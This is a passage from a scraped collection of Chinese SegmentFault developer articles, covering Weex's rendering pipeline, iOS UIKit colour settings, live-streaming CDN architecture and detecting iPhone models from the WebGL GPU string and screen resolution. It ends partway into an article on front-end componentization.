<p><code>.vue</code> 文件通常可以分为三部分：<code>&lt;template&gt;</code> 、<code>&lt;style&gt;</code> 和 <code>&lt;script&gt;</code>，<code>&lt;template&gt;</code> 是必须要有的，其他可选。其中 <code>&lt;script&gt;</code> 中的代码会保留或者被转换成 ES5 的语法；<code>&lt;style&gt;</code> 中的 CSS 在 Weex 平台上会被转换成 JSON 格式的样式声明，放到组件的定义中去；<code>&lt;template&gt;</code> 会被编译生成组件定义中 render 函数，可以理解为 render 函数的语法糖。</p>
<p>上述例子真实生成的代码是<a href=""http://dotwe.org/raw/dist/fc1ad62998bb1dd00f007711d57ed375.bundle.wx"" rel=""nofollow noreferrer"">这样的</a>，比较乱，把模块解开将其简化一下，和下边的代码等价：</p>
<pre><code class=""js"">// { ""framework"": ""Vue"" }

new Vue({
  el: '#root',
  style: {
    freestyle: {
      textAlign: 'center',
      fontSize: 200
    }
  },
  render: function (h) {
    return h(
      'div',
      { staticStyle: { justifyContent: 'center' } },
      [h(
        'text',
        { staticClass: ['freestyle'] },
        ['哟']
      )]
    )
  }
})</code></pre>
<h2>执行</h2>
<h3>初始化执行环境</h3>
<p>要想在移动端上执行上述代码，就需要集成 Weex SDK。</p>
<p>在应用启动时就会初始化 Weex SDK，准备好执行环境，然后可以从网络或者本地加载打包好的 js 文件，调用 SDK 提供的 render 或者 renderWithURL 方法启动渲染。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVRRJu?w=1608&amp;h=1608"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>图中画出了 Weex SDK 的部分内容。其中 <code>weex-vue-framework</code> 和 <code>Vue.js</code> 是对等的，语法和内部机制都是一样的，只不过 <code>Vue.js</code> 最终创建的是 DOM 元素，而 <code>weex-vue-framework</code> 则是向原生端发送渲染指令，最终渲染生成的是原生组件。Weex Runtime 用来对接上层前端框架（如 Vue.js 和 Rax）并且负责和原生端之间的通信。Render Engine 就是针对各个端开发的原生渲染器，包含了 Weex 内置组件和模块的实现，可扩展。</p>
<blockquote><p><strong>在 Weex SDK 中也含有 <code>weex-rax-framework</code>，支持使用 <a href=""https://alibaba.github.io/rax/"" rel=""nofollow noreferrer"">Rax</a> 作为其上层前端框架。</strong> 这个例子使用的是 Vue 2.0 的语法，为了简洁只画出了 weex-vue-framework。</p></blockquote>
<h3>创建组件</h3>
<p>Weex 接收到 js 文件以后，会先检查它的格式，发现用的是 Vue 版本，就会调用 <code>weex-vue-framework</code> 中提供的 <code>createInstance</code> 方法创建实例。</p>
<p>代码里 <code>new Vue()</code> 会创建一个组件，通过其 <code>render</code> 函数创建 VNode 节点，并且触发相应的生命周期，如果指定了 <code>el</code> 属性也会执行挂载（mount），根据 Virtual DOM 在指定平台中生成真实的 UI 组件。</p>
<p>上述代码只有一个组件两个标签和一些简单样式，最终生成的 VNode 节点如下（数据结构有简化）：</p>
<pre><code class=""js"">{
  tag: 'div',
  data: {
    staticStyle: { justifyContent: 'center' }
  },
  children: [{
    tag: 'text',
    data: {
      staticClass: 'freestyle'
    },
    context: {
      $options: {
        style: {
          freestyle: {
            textAlign: 'center',
            fontSize: 200
          }
        }
      }
    },
    children: [{
      tag: '',
      text: '哟'
    }]
  }]
}</code></pre>
<h3>Patch</h3>
<p>再生成了 VNode 节点之后，还需要执行 “patch” 将虚拟 DOM 绘制成真实的 UI。在执行 patch 之前的过程都是 Web 和 Weex 通用的，所以文件格式、打包编译过程、模板指令、组件的生命周期、数据绑定等上层语法都是一致的。</p>
<p>然而由于目标执行环境不同（浏览器和 Weex 容器），在渲染真实 UI 的时候调用的接口也不同。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVRRJB?w=2445&amp;h=1240"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>在 Vue.js 内部，Web 平台和 Weex 平台中的 <code>patch</code> 方法是不同的，但是都是由 <code>createPatchFunction</code> 这个方法生成的，它支持传递 <code>nodeOps</code> 参数，在其中代理了所有 DOM 操作。在 Web 平台中 <code>nodeOps</code> 背后调用的都是 Web API，在 Weex 平台中则调用的是 Weex Runtime 提供的 <a href=""http://weex.apache.org/cn/references/native-dom-api.html"" rel=""nofollow noreferrer"">Native DOM API</a>。触发 DOM 渲染的入口一致，但是不同平台的实现方式不同。</p>
<p>例如 <code>nodeOps</code> 中的 <code>createElement</code> 的操作，在 Web 平台中实际调用的是 <code>document.createElement(tagName)</code> 这个接口（<a href=""https://github.com/vuejs/vue/blob/v2.4.2/src/platforms/web/runtime/node-ops.js#L5-L15"" rel=""nofollow noreferrer"">参考代码</a>）；而在 Weex 平台中实际执行的是 <code>new renderer.Element(tagName)</code>（<a href=""https://github.com/vuejs/vue/blob/v2.4.2/src/platforms/weex/runtime/node-ops.js#L6-L8"" rel=""nofollow noreferrer"">参考代码</a>）。</p>
<h2>发送渲染指令</h2>
<p>上述页面的 patch 过程不仅限于 Vue，在 Rax 中也调用了 Weex 的 Native DOM API，实现原理是一致的。发送渲染指令的过程是所有上层前端框架通用的，上层使用 Vue 还是 Rax 对于原生渲染器而言是透明的，只是语法和构建 Virtual DOM 的方式有差异而已。</p>
<p>在上层前端框架调用了 Weex 平台提供的 Native DOM API 之后，Weex Runtime 会构建一个用于渲染的节点树，并将操作转换成渲染指令发送给客户端。</p>
<p>回顾文中提到的 “哟” 例子，上层框架调用了 Weex Runtime 中 <code>createBody</code> 、<code>createElement</code> 、<code>appendChild</code> 这三个接口，简单构建了一个用于渲染的节点树，最终生成了两条渲染指令。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVRRJG?w=2657&amp;h=1559"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<blockquote><p>这些都属于 Weex SDK 内部的底层细节，上层应用的开发者，乃至前端框架开发者都不需要了解此格式，而且在迭代过程中很可能还会有调整。</p></blockquote>
<p>图中的 Platform API 指的是原生环境提供的 API，这些 API 是 Weex SDK 中原生模块提供的，不是 js 中方法，也不是浏览器中的接口，是 Weex 内部不同模块之间的约定。</p>
<p>目前来说渲染指令是基于 JSON 描述的，具体格式大致如下所示：</p>
<pre><code class=""js"">{
  module: 'dom',
  method: 'createBody',
  args: [{
    ref: '_root',
    type: 'div',
    style: { justifyContent: 'center' }
  }]
}</code></pre>
<pre><code class=""js"">{
  module: 'dom',
  method: 'addElement',
  args: ['_root', {
    ref: '2',
    type: 'text',
    attr: { value: '哟' },
    style: { textAlign: 'center', fontSize: 200 }
  }]
}</code></pre>
<h2>渲染原生组件</h2>
<p>原生渲染器接收上层传来的渲染指令，并且逐步将其渲染成原生组件。</p>
<p>渲染指令分很多类，文章中提到的两个都是用来创建节点的，其他还有 <code>moveElement</code> 、<code>updateAttrs</code> 、<code>addEvent</code> 等各种指令。原生渲染器先是解析渲染指令的描述，然后分发给不同的模块。关于 UI 绘制的指令都属于 <code>""dom""</code> 模块中，在 SDK 内部有组件的实现，其他还有一些无界面的功能模块，如 stream 、navigator 等模块，也可以通过发送指令的方式调用。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVRRJ9?w=2162&amp;h=1620"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>这个例子里，第一个 <code>createBody</code> 的指令就创建了一个 <code>&lt;div&gt;</code> 的原生组件，同时也将样式应用到了改组件上。第二个 <code>addElement</code> 指令向 <code>&lt;div&gt;</code> 中添加一个 <code>&lt;text&gt;</code> 组件，同时也声明了组件的样式和属性值。</p>
<p>上述过程不是分阶段一个一个执行的，而是可以实现“流式”渲染的，有可能第一个 <code>&lt;div&gt;</code> 的原生组件还没渲染好，<code>&lt;text&gt;</code> 的渲染指令又发过来了。当一个页面特别大时，能看到一块一块的内容逐渐渲染出来的过程。</p>
<h2>总结</h2>
<p>没啥可总结的，都是细节，而且是框架内部的细节，以后很可能还会变，对于如何写好 Weex 的代码没有半毛钱帮助。</p>

                ", 详解 Weex 页面的渲染过程,1531971939,226,1,405,1,1,https://segmentfault.com/a/1190000010415641
50,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010418876"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>最近发现做界面的时候，有时会忘记某种控件的颜色怎么设置，需要去网上进行搜索，所以写下这篇文章。  </p>
<p>一方面是收藏起来自己查阅，一方面是分享给大家。目标是有了这篇文章，不用再去搜索和颜色设置有关的内容。  <br>下面进入正题</p>
<h2>导航栏</h2>
<pre><code>/* 全局设置 */

// 标题颜色
// 如果需要设置字体就在字典中加入 [UIFont fontWithName:@""Hiragino Sans GB"" size:14]
[[UINavigationBar appearance] setTitleTextAttributes:
                    @{NSForegroundColorAttributeName:[UIColor whiteColor]}];

// 导航栏背景颜色
[[UINavigationBar appearance] setBarTintColor:[UIColor whiteColor]];

// 导航栏返回按钮、自定义UIBarButtonItem颜色
[[UINavigationBar appearance] setTintColor:[UIColor blackColor]];


/* 单独设置 */

// 导航栏标题颜色
self.navigationController.navigationBar.titleTextAttributes = @{NSForegroundColorAttributeName:[UIColor whiteColor]};

// 导航栏背景颜色
self.navigationController.navigationBar.barTintColor = [UIColor whiteColor];

// 导航栏返回按钮、自定义UIBarButtonItem颜色
self.navigationController.navigationBar.tintColor = [UIColor blackColor];

</code></pre>
<h2>状态栏</h2>
<p>进入 <strong>Targets -&gt; General -&gt; Status Bar Style</strong>，可以设置 黑色(默认) 和 白色。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000010364491"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""状态栏.png"" title=""状态栏.png""></span></p>
<blockquote>如果需要精确控制不同页面的颜色，还是需要代码设置。</blockquote>
<p>首先给 <code>info.plist</code> 加上这句话<br><span class=""img-wrap""><img data-src=""/img/remote/1460000010364492"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<pre><code>// View controller-based status bar appearance
// 加入这个参数，我们前面方法的设置就会失效
// 接下来就可以使用代码进行设置了

/* 全局设置 */

[UIApplication sharedApplication].statusBarStyle = UIStatusBarStyleLightContent;

/* 单独设置 */

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

// 细心的朋友读者可能会疑问，为什么这次不能用
self.navigationController.preferredStatusBarStyle = UIStatusBarStyleLightContent;
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010364493"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>答案很简单，仔细看报错就知道这是一个 <code>readonly</code> 的属性，所有我们直接<strong>重写他的 set 方法。</strong></p>
<h2>TabBar</h2>
<pre><code>/* 全局设置 */
// TabBar背景颜色
[UITabBar appearance].barTintColor = [UIColor whiteColor];

/* 单独设置 */
// TabBar背景颜色
self.tabBarController.tabBar.barTintColor = [UIColor whiteColor];
</code></pre>
<blockquote>TabBar图标颜色<br>不用写乱七八糟的代码，直接到 Assets.xcassets 里把图片的属性 Render 设置为 Original Image 就可以让颜色按照图片的来，而不会选中变蓝了。</blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010364494"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""TabBar图标颜色"" title=""TabBar图标颜色""></span></p>
<h2>Button</h2>
<pre><code>// 字体颜色
// 有人可能会误用这两个错误的方法
// 错误1：[button.titleLabel setTextColor:[UIColorblackColor]];
// 错误2：button.titleLabel.textColor = [UIColor redColor];
// 正确
[button setTitleColor:[UIColor blackColor]
             forState:UIControlStateNormal];

// 边框颜色
// 默认没有边框，第一行是设置线条，第二行重点在于layer的颜色要用CGColor
button.layer.borderWidth = 2.0;
button.layer.borderColor = [UIColor blackColor].CGColor;
</code></pre>
<h2>TextField</h2>
<pre><code>// placeholder颜色设置
textField.attributedPlaceholder = [[NSAttributedString alloc] initWithString:@""placeHoldtext"" attributes:@{NSForegroundColorAttributeName: [UIColor redColor]}];    </code></pre>
<h2>AttributedString</h2>
<pre><code>// 初始化NSMutableAttributedString
NSMutableAttributedString *str = [[NSMutableAttributedString alloc] initWithString:@""Using NSAttributed String""];
// 颜色设置
[str addAttribute:NSForegroundColorAttributeName
            value:[UIColor blueColor]
            range:NSMakeRange(0,5)];
[str addAttribute:NSForegroundColorAttributeName
            value:[UIColor redColor]
            range:NSMakeRange(6,12)];
[str addAttribute:NSForegroundColorAttributeName
            value:[UIColor greenColor]
            range:NSMakeRange(19,6)];
// 字体设置
[str addAttribute:NSFontAttributeName
            value:[UIFont fontWithName:@""Arial-BoldItalicMT"" size:30.0]
            range:NSMakeRange(0, 5)];
[str addAttribute:NSFontAttributeName
            value:[UIFont fontWithName:@""HelveticaNeue-Bold"" size:30.0]
            range:NSMakeRange(6, 12)];
[str addAttribute:NSFontAttributeName
            value:[UIFont fontWithName:@""Courier-BoldOblique"" size:30.0]
            range:NSMakeRange(19, 6)];
// 把AttributedString赋值给Label
attrLabel.attributedText = str;
</code></pre>
<h2>通用部分</h2>
<pre><code>// 字体颜色    适用于Label、TextField、TextView等
label.textColor = [UIColor whiteColor];
textField.textColor = [UIColor yellowColor];
textView.textColor = [UIColor yellowColor];

// 背景颜色    基本都使用
someView.backgroundColor = [UIColor whiteColor];
</code></pre>
<h2>工具</h2>
<blockquote>系统自带的测色工具，位置在 应用程序 -&gt; 实用工具( Launchpad 里叫其他) -&gt; 数码测色计</blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010364495"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""数码测色计"" title=""数码测色计""></span></p>
<p><strong>使用方法：</strong><br><code>打开后指向你想测色的地方即可显示他的 RGB 色，以这个 Switch 举个例子。</code></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010364496"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""颜色测试"" title=""颜色测试""></span></p>
<p>我们设置完rgb色后和你想要的略有差别。这里提供一个解决办法。<strong>设置颜色的时候，点击右边的小齿轮，选择 sRGB。</strong></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010364497"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""sRGB"" title=""sRGB""></span></p>
<blockquote>几种常用的列举的差不多了。不完整的地方大家可以提出来，我会对这个文章进行更新。</blockquote>

                ", iOS 颜色设置看我就够了,1531971940,518,1,447,1,1,https://segmentfault.com/a/1190000010364486
51,1,0,6,"
                    
<p>网络直播平台现下已经十分火热，很多常见的直播平台都采用了阿里云直播CDN来搭建自身业务。今天来介绍下视频的一些基础知识和视频直播的架构。</p>
<p>在进入正题之前，我们先来了解视频直播相关的名词含义是什么？扫个盲</p>
<p>通常我们所说的视频，是指连续的图象变化每秒超过24帧（Frame）画面以上时，根据视觉暂留原理，人眼无法辨别单幅的静态画面，看上去是平滑连续的视觉效果，这样连续的画面叫做视频。</p>
<p>而媒体转码是指将一段多媒体包括音频、视频或者其他的内容从一种编码格式转换成为另外一种编码格式。</p>
<p>其中内容分发网络就是大家常说的CDN，这里主要包含流媒体服务器，负载均衡，路由重定向，视频转码，视频录制存储，防盗链，性能等相关技术内容。</p>
<p>下面这几个词我们也经常遇到：</p>
<p>码率是数据传输时单位时间传送的数据位数，一般我们用的单位是kbps即千位每秒。 通俗一点的理解就是取样率， 单位时间内取样率越大，精度就越高，处理出来的文件就越接近原始文件，但是文件体积与取样率是成正比的，所以几乎所有的编码格式重视的都是如何用最低的码率达到最少的失真。但是因为编码算法不一样，所以也不能用码率来统一衡量音质或者画质。</p>
<p>另一个常见的词是帧，它是一段数据的组合，它是数据传输的基本单位。就是影像动画中最小单位的单幅影像画面，相当于电影胶片上的每一格镜头。一帧就是一副静止的画面，连续的帧就形成动画，如电视图像等。</p>
<p>与之相对应的帧率，即每秒显示帧数，帧率表示图形处理器处理场时每秒钟能够更新的次数。高的帧率可以得到更流畅、更逼真的动画。一般来说30fps就是可以接受的，但是将性能提升至60fps则可以明显提升交互感和逼真感，但是一般来说超过75fps一般就不容易察觉到有明显的流畅度提升了。如果帧率超过屏幕刷新率只会浪费图形处理的能力，因为监视器不能以这么快的速度更新，这样超过新率的帧率就浪费掉了。</p>
<p>这里我们再展开聊一下视频帧</p>
<p>音频帧一般可以独立解码，可以直播播放。<br>而视频分为视频关键帧和非关键帧，关键帧可以独立解码渲染，播放器拿到后可以直接看到画面，一般10K以上甚至几十K；其他非关键帧解码依赖于前面的一些视频帧，播放器会根据前面的帧和这一帧来解码产生画面，非关键帧一般大小是几K甚至不到1K。对于播放器来说，服务器一般会从视频关键帧开始发送，这样才不会产生花屏。</p>
<p>对于节点上直播服务器存储的内容，如果是文件加速，节点上存储的内容很明确，就是文件数据, URL不变的话文件数据内容也不变。但是对于直播来讲，传输的就是帧数据，缓存的也是不断变化的帧序列数据。</p>
<p>下面的图里我们可以看到，当前的服务器缓存了V1-V3五帧数据，当V4这个关键帧出现了，服务器把之前的丢掉，开始缓存V4开始的音视频数据，以这个策略保证过来的播放端都是当前最新的数据。一般直播服务器都是用这个策略来进行服务器缓存的。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010242802"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""视频帧"" title=""视频帧""></span></p>
<p>下面进入正题，常见的CDN加速包括文件加速、点播、直播三种业务。最开始阿里云CDN是从文件加速开始，针对的主要是内部客户，像淘宝，它的图片非常多，那时候支持的都是小文件加速。后来随着各BU的端产品衍生，逐渐会支持大的文件下载业务；等阿里云CDN正式作为产品上线商业化时候，开始支持点播业务。2015年下半年，开始支持直播业务。今天阙寒主要从直播概述、直播架构、业务功能和场景来介绍下阿里云CDN直播系统。</p>
<p>一、直播概述<br>通常，视频直播常见两种形式是手机直播和游戏直播，手淘、陌陌、映客的典型的手机直播平台，游戏直播就是像斗鱼、全民TV等平台。其实对于播放端来讲，直播和点播都是向服务器获取视频数据，播放端对声音和画面进行播放的过程。从这个角度来讲，直播和点播区别并不大。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010242803"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""直播场景"" title=""直播场景""></span></p>
<p>那直播和点播究竟区别在哪里？<br>对于视频点播，你在看的时候，你可以随时选择快进和回退。直播却不能。<br>对于视频网站上的视频文件来讲，点播可以选择今天看或明天看，但是直播却不能选择时间，像每周末的联赛只在固定的时间播放。一些机顶盒提供回看的功能，也是点播。</p>
<p>所以回归正题，简而言之，直播就是每一帧数据打上时序标签后进行流式传输的过程。发送端源源不断的采集音视频数据，经过编码、封包、推流、再经过分发网络进行扩散传播，播放端再源源不断地下载数据并按时序进行解码播放。如此就产生了边生产、边传输、边消费的直播过程。</p>
<p>我们将视频直播整个流程主要分为几个关键阶段：视频采集、前处理、编码、推流、转码、分发、播放，下图为简化版直播系统的基本架构，后面我们再详细展开。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010242804"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""直播流程图"" title=""直播流程图""></span></p>
<ol>
<li><p>采集，是视频直播开始的第一个环节，用户可以通过不同的终端采集视频，也就是主播直播的过程。iOS端适配性较好，采集起来比较简单。Android端因为一直以来市面机型多版本复杂种种情况，加大了一个库适配所有硬件的难度，采集起来相对比较困难。PC端则和摄像头驱动联系紧密，目前市面上最好的PC端源免费软件是OBS。</p></li>
<li><p>前处理，业内有一种说法，80%的主播没有美颜根本没法看。所以美颜已经是对视频源进行前处理的标配功能，除此之外还有水印、模糊特效等，针对不同的手机系统提供不同的处理库。</p></li>
<li><p>编码，编码时候我们需要处理的硬件兼容性问题和寻求码率和画质之前的平衡是最大的两个问题。iOS系统硬件兼容性比较好，可以采用硬编，Android系统则还是因为硬件机型问题，大多采用软编。</p></li>
<li><p>推流与转码，在数据传输的整个过程中从主播端到服务器端，再到边缘节点，以及从边缘节点到播放端。为了让采集端的流适配各个平台端不同协议，一般都会在服务端进行转码处理，将视频文件转成不同格式，支持 RTMP、HLS和FLV等不同的协议。</p></li>
<li><p>分发，随着移动直播兴起和游戏直播的持续火热，网络直播平台支持亿高并发是理论上应该做到的，为了优化终端观看直播的体验，一般都会采用CDN进行内容分发加速，实现高并发等能力。</p></li>
<li><p>客户端播放，也就是解码和渲染，目前 iOS 端的播放兼容性较好，Android 的硬件解码和编码一样也存在兼容性问题。通常秒开、低延时等问题是需要在播放端来克服的。</p></li>
</ol>
<p>二、直播架构</p>
<p>这是一张阿里云直播全景解决方案的图，这里包括详细的推流端推流，直播中心的流存储，转码截图录制等视频处理，CDN智能调度与分发，最后到播放端播放整个过程。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVQ8MV?w=865&amp;h=463"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""直播解决方案"" title=""直播解决方案""></span></p>
<ol>
<li><p>对于推流端推流，目前主要使用的是RTMP协议，播放可以使用RTMP、HTTP FLV和HLS协议，常用的推流端是OBS、手机APP、FFmpeg；播放端包括Flash、VLC、HTML5、手机APP等形式；<br>2.视频直播中心拥有稳定的推流上行链路，支持连麦、IM、直播间管理等分丰富的直播服务端实现流能力；</p></li>
<li><p>CDN直播分发提供流畅的播放下行链路，700多个国内节点和300多个海外节点，还有丰富的小运营商节点。</p></li>
<li><p>对于播放端，我们做了首屏秒开优化和弱网跳帧播放，确保用户体验。</p></li>
</ol>
<p>对于视频直播服务器的一个进程上来讲，我们可以认为一个推流端和多个播放端是一种非常典型的发布和订阅的关系。从下图可以看到，主播完成发布动作，这条直播内容也就是这一路流推动到服务器，三个观众也就是订阅者，从服务器拉流，也就是用播放动作来完成推流。这种进程内部、节点之间的发布、订阅关系是一种级联的关系，CDN的直播分发就是依靠这种模式构建。</p>
<p>那下面我们从CDN分发的角度来基础架构是怎样的。内容通过存储集群到达发布集群，再通过骨干中转环境的L2，利用CDN智能调度到达L1，也就是距离用户最近的节点，从顺利的推送给用户。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010242806"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""CDN基础架构图"" title=""CDN基础架构图""></span></p>
<p>三、业务功能及场景<br>说完了架构，阙寒带我们来了解业务功能和阿里云CDN的应用场景。对于直播来讲，转码这个业务功能很重要。转码后会在原始流名上加后缀，下图是转码前后的画质、码率的区别。和转码相关的有水印、动态模板、延迟转码等功能。</p>
<p>截图也是比较重要的业务，比如说直播平台页面分类下有很多张图片，刷新后图片会变化，都是靠周期性截图来完成。除此之外，阿里云也开放对直播进行动态配置、录制、开播断流回调、推流播放鉴权、断流、黑名单、禁播、各种接口API、转推其他厂商、触发式拉流、连麦、播放纯音频/视频等。</p>
<p>另外比较重要的是直播数据的监控，对客户和我们来说，能时刻关注直播情况，掌握直播数据，对于防范问题来说是十分必要的。视频监控是用来记录一路流重要信息，比如常见的视频码率、播放流量和在线人数、视频帧率监控。视频的特性是每秒钟帧率比较固定，视频帧大概是20~30帧/秒, 造成卡顿的主要原因一般是网络链路的抖动，有了全链路秒级帧率监控图之后, 排查问题变得非常的方便, 针对一路流卡顿以及客户提出的各种问题可以很快的就明确原因。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010242807"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""数据监控"" title=""数据监控""></span></p>
<p>正常的监控图应该是一条直线，上图的帧率出现的突刺，就是因为公网网络连接抖动后统计出来的数据降低。对于一路流多个播放端来讲，服务器会不断把帧数据写给播放端，一旦网络抖动，遇到写不出去的情况会将这一帧放到连接的等待队列里，超出了帧队列的长度限制，服务器会选择丢帧。一般这种情况产生是因为网络抖动的比较严重，我们也会以此为依据来确定网络全链路的质量，用红绿颜色来标注区分正常和非正常的链路质量。</p>
<p>那以上的架构和业务功能都可以应用于哪些场景呢？我们也对阿里云视频直播CDN服务的客户场景进行了归类汇总，主要有以下五个方向：</p>
<ol>
<li><p>UGC互动直播：不仅提供推流到播放的全套直播解决方案，而且集成成熟的互动解决方案，包括IM，连麦等功能。例如：一直播、映客等直播互动平台。</p></li>
<li><p>电商直播：为电商直播提供全套直播解决方案，支持动态扩展的直播技术架构，无需担心直播促销涌入的峰值流量担忧。例如：手淘等电商直播平台。</p></li>
<li><p>体育赛事／大型综艺节目直播：为热门的赛事和综艺直播提供动态扩展的直播服务，通过CDN和PCDN的分发，用户无需为突然涌入的流量担忧。例如：CCTV5，等电视直播平台。</p></li>
<li><p>游戏直播：对游戏直播提供各种采集设备的接入，以及直播的录制功能，便于游戏直播平台提供点播服务。例如：全民，熊猫，等游戏直播平台。</p></li>
<li><p>在线教育／财经直播：提供直播鉴权、直播防盗链、URL加密等功能，为教育、财经类的直播提供安全保障。例如：第一财经等财经平台和知图教育等教育类直播平台。</p></li>
</ol>
<p>以上就是阿里云直播CDN相关的内容，目前，超过一半的视频直播、点播平台都在使用阿里云的直播服务，我们会通过不断丰富和升级视频服务能力，打造围绕视频领域的技术生态。</p>
<p>作者：阿里云CDN团队技术专家阙寒   阿里云产品运营樰篱</p>

                ", 深度了解视频直播CDN技术,1531971942,577,1,149,1,1,https://segmentfault.com/a/1190000010242798
52,1,0,6,"
                    
<p>我们一般在浏览器里识别用户的访问设备都是通过 <code>User Agent</code> 这个字段来获取的，但是通过它我们只能获取一个大概的信息，比如你用的是 Mac 还是 Windows，用的是 iPhone 还是 iPad。如果我想知道你用的是第几代 iPhone，这个方法就不行了，前段时间我正好有这个需求，识别移动客户端的具体型号（主要是 iOS 设备），于是思考了下这个问题的实现。</p>
<p>首先，我跟大家一样想到了 UA，不过事实证明这路走不通。就在我无聊一个一个摆弄浏览器的 API 时，突然一篇文章里的某段代码提醒了了我。这篇文章讲的是怎样通过 js 获取图形设备信息的，因为 HTML5 支持了 canvas，所以可以通过 API 获取图形设备的型号，比如显卡的型号。</p>
<pre><code class=""javascript"">(function () {
    var canvas = document.createElement('canvas'),
        gl = canvas.getContext('experimental-webgl'),
        debugInfo = gl.getExtension('WEBGL_debug_renderer_info');

    console.log(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
})();</code></pre>
<p>运行这段代码就可以获取显卡的型号了，如果你在iOS的设备里运行，会获取到诸如 <code>Apple A9 GPU</code> 之类的信息。<strong>而我们知道每一代 iOS 设备的 GPU 型号都是不同的，比如 iPhone 6 是 A8，而 iPhone 6s 就是 A9。</strong>看到这里，你应该大概知道我的思路了，就是通过识别 GPU 的型号来辨别设备的型号。</p>
<p>不过这还有个小瑕疵，有些设备是同一代，也就是 GPU 型号完全相同，比如 iPhone 6s, iPhone 6s Plus, iPhone SE。它们用的都是 <code>Apple A9 GPU</code>，怎么区分开它们呢？你会发现它们最大的不同不就是分辨率不同吗？而通过 JavaScript 我们又可以方便地获取屏幕分辨率，这样把两个手段综合应用一下就可以获取设备的准确型号了。</p>
<p>这里有个示例网址，大家可以用手机访问<br><a href=""https://joyqi.github.io/mobile-device-js/example.html"" rel=""nofollow noreferrer"">https://joyqi.github.io/mobil...</a></p>
<p>我的代码都放在了 GitHub 上<br><a href=""https://github.com/joyqi/mobile-device-js"" rel=""nofollow noreferrer"">https://github.com/joyqi/mobi...</a></p>
<p>这次思考给了我一些解决问题的启发，我们在思考解决方案的时候从侧面入手说不定会有新的发现。就比如我们的这个代码，目前还无法识别同一代的 iPad Air 和 iPad mini，因为它们的 GPU 和分辨率均相同，但是延续这个思路其实是有很多解决方案的，比如大家可以研究下这两个设备的话筒和喇叭个数，而这个数量也是可以通过 JS 获取的 :P</p>

                ", 思路清奇：通过 JavaScript 获取移动设备的型号,1531971944,547,1,286,1,1,https://segmentfault.com/a/1190000010157682
53,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/bVQDrp?w=2048&amp;h=1280"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>序</h2>
<p>今年大前端的概念一而再再而三的被提及，那么大前端时代究竟是什么呢？大前端这个词最早是因为在阿里内部有很多前端开发人员既写前端又写 Java 的 Velocity 模板而得来，不过现在大前端的范围已经越来越大了，包含前端 + 移动端，前端、CDN、Nginx、Node、Hybrid、Weex、React Native、Native App。笔者是一名普通的全职 iOS 开发者，在接触到了前端开发以后，发现了前端有些值得移动端学习的地方，于是便有了这个大前端时代系列的文章，希望两者能相互借鉴优秀的思想。谈及到大前端，常常被提及的话题有：组件化，路由与解耦，工程化（打包工具，脚手架，包管理工具），MVC 和 MVVM 架构，埋点和性能监控。笔者就先从组件化方面谈起。网上关于前端框架对比的文章也非常多（对比 React，Vue，Angular），不过跨端对比的文章好像不多？笔者就打算以前端和移动端（以 iOS 平台为主）对比为主，看看这两端的不同做法，并讨论讨论有无相互借鉴学习的地方。</p>
<p>本文前端的部分也许前端大神看了会觉得比较基础，如有错误还请各位大神不吝赐教。</p>
<hr>
<h2>Vue 篇</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010122336"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>一. 组件化的需求</h3>
<p>为了提高代码复用性，减少重复性的开发，我们就把相关的代码按照  template、style、script 拆分，封装成一个个的组件。组件可以扩展<br> HTML 元素，封装可重用的 HTML 代码，我们可以将组件看作自定义的 HTML 元素。在 Vue 里面，每个封装好的组件可以看成一个个的 ViewModel。</p>
<h3>二. 如何封装组件</h3>
<p>谈到如何封装的问题，就要先说说怎么去组织组件的问题。</p>
